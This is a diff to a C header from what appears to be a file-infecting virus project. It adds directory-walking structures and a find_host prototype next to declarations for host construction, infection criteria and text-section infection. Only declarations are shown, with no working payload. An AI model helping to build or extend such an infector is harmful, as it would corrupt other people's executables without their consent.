@@ -20,6 +20,7 @@
 #include <time.h>
 #include <sys/wait.h>
 #include <sys/random.h>
+#include <limits.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// MACROS 
@@ -40,6 +41,8 @@
 
 #define STACK_SIZE 1024 * 64
 
+#define BUFF_SIZE 8192
+
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
 ////////////////////////////////////////////////////////////////////////////////
@@ -53,6 +56,21 @@ enum e_context
 ////////////////////////////////////////////////////////////////////////////////
 /// STRUCTURES
 ////////////////////////////////////////////////////////////////////////////////
+
+struct linux_dirent64
+{
+	uint64_t d_ino;
+	int64_t d_off;
+	unsigned short d_reclen;
+	unsigned char d_type;
+	char d_name[];
+};
+
+struct s_directory
+{
+	char path[PATH_MAX];
+	size_t entry;
+};
 
 struct s_note
 {
@@ -95,7 +113,7 @@ struct s_keychain
 // LINEAR FLOW 
 void __entry(void);
 
-void war(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context);
 void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context);
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
